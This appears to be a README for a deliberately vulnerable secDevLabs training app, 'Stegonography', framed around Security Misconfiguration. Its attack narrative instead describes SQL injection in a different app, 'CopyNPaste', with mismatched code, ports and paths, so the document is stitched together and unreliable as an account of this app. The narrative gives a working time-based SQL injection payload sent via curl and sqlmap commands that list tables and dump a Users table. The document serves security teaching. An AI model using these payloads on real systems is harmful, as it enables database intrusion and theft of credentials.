# Stegonography

<p align="center">
    <img src="images/stegonography.png"/>
</p>

Stegonography is a Node.js web application that uses an API and a simple front end to simulate a real steganography application. It is built with two main routes, it's home( `/` ) and `/login`, where the admin can log in to make changes to the page.

## Index

- [Definition](#what-is-security-misconfiguration)
- [Setup](#setup)
- [Attack narrative](#attack-narrative)
- [Objectives](#secure-this-app)
- [Solutions](#pr-solutions)
- [Contributing](#contributing)

## What is Security Misconfiguration?

Security misconfiguration can happen at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options, etc.

The main goal of this project is to discuss how **Security Misconfiguration** vulnerabilities can be exploited and to encourage developers send Pull Requests to secDevLabs on how they would mitigate these flaws.

## Setup

To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh
cd secDevLabs/owasp-top10-2017-apps/a6/stegonography
```

```sh
make install
```

Then simply visit [localhost:10006][App] ! 😆

## Get to know steps

To properly understand how this application works, you can follow these simple steps:

- Register a new user via front-end.
- Login as this user via front-end.
* Register another user now using command line:
```sh
curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password", "passcheck":"password"}' http://localhost:3000/register
```
* Login as this second user now using command line:
```sh
curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password"}' http://localhost:3000/login

```

## Attack narrative

Now that you know the purpose of this app, what could go wrong? The following section descrides how an attacker could identify and exploit an SQL Injection in CopyNPaste app. We encourage you follow these steps and try to reproduce the attack itself before reading any code.

#### Vulnerability identification  👀

After reviewing `NewUser()` , `CheckIfUserExists()` and `AuthenticateUser()` from [`db.go`]((https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2017-apps/a1/copy-n-paste/app/util/db.go#)) file, it was possibile to see that some input from users are concatenated with SQL queries, as shown in the following codes:

```go
query := fmt.Sprint("select * from Users where username = '" + user + "'")

```

```go
query := fmt.Sprint("insert into Users (username, password) values ('" + user + "', '" + passHash + "')")
```

```go
query := fmt.Sprint("select username from Users where username = '" + username + "'")
```

As no validation is present to these variables, SQL injections may be successfuly executed in the database. Using web interface, we send some information using form for inspect how web interface comunicates with API.

<img src="images/attack-0.png" align="center"/>

To confirm this, the following payload could be used that, if the application is indeed vulnerable, a 5 seconds delay will be noted after sending it:

<img src="images/attack-1.png" align="center"/>

Using `curl` on CLI interface, we can test again (with a 30 seconds delay):

```sh
curl -s -H "Content-Type: application/json" -d '{"user":"-1'\'' union select 1,2,sleep(30) -- ", "pass":"password"}' http://127.0.0.1:3000/login
```

Request:

<img src="images/attack-2.png" align="center"/>

30 seconds later:

<img src="images/attack-3.png" align="center"/>

#### Vulnerability exploitation 🔥

An attacker could now create any malicious SQL queries and send to the API that, in theory, will be executed. For this attack narrative, [sqlmap](https://github.com/sqlmapproject/sqlmap) will be used to exemplify how an automated SQL Injection attack may be performed.

To install sqlmap on Mac you can simply type:

```sh
brew install sqlmap
```

First possible step is to create a `postRequest.txt` containing the HTTP POST itself, as shown in the following code:

```sh
POST /login HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: curl/7.54.0
Accept: */*
Content-Type: application/json
Content-Length: 31

{"user":"user", "pass":"password"}
```

Before executing the attack, you can open a new tab in your terminal and type the following command to observe how the malicious requests will come to the app:

```sh
docker logs a1_api -f
```

After that, we could now use `-r` option and wait sqlmap perform multiples malicious requests until it finds the vulnerable parameter:

```sh
sqlmap -r postRequest.txt
```

<img src="images/attack-4.png" align="center"/>

After understanding how this database is structured, an attacker could use the following command to retrieve database details:

```sh
sqlmap -r postRequest.txt --tables
```

And then retrieve sensitive information from it:

```sh
sqlmap -r postRequest.txt -D a1db -T Users --dump
```

<img src="images/attack-5.png" align="center"/>

## Secure this app 🔧

How could you now migitate this vulnerability? After your code modification, an attacker should not be able to:

* Execute SQL queries into database.

## PR solutions

[Spoiler alert] To understand how this vulnerability can be mitigated, check [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22CopyNPaste+API%22)!

## Contributing

We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉

[Docker Install]:  https://docs.docker.com/install/
[Docker Compose Install]: https://docs.docker.com/compose/install/
[App]: http://localhost:10006